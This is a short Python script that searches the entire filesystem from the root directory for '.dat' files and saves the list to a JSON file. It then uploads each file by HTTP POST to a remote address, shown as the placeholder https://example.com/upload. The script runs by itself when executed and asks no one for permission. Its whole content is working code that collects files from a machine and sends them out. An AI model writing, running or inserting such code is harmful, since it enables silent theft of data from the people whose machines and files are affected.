import requests 
import os
import json

# send file to server
def post_files(files_list, url):
    for file_path in files_list:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(url, files=files)
            print(f"Uploaded {file_path} with status code {response.status_code}")

# Function to list files and save them in JSON file
def list_files_with_extension(startpath, extension, output_json):
    files_list = []
    for root, dirs, files in os.walk(startpath):
        for file in files:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                files_list.append(file_path)
    
    # Save the list of files in a JSON file
    with open(output_json, 'w', encoding='utf-8') as f:
        json.dump(files_list, f, ensure_ascii=False, indent=4)
    
    return files_list

def find_file():
    startpath = "/"
    extension = ".dat"  # The desired file extension to search
    url = "https://example.com/upload"  # Address to send files
    output_json = "found_files.json"    # The name of the JSON file to store the list of files
    files_list = list_files_with_extension(startpath, extension, output_json)
    try:
        post_files(files_list, url)
    except Exception as e:
        print(f"Network ERROR: {e}")

# Run the find_file function
find_file()
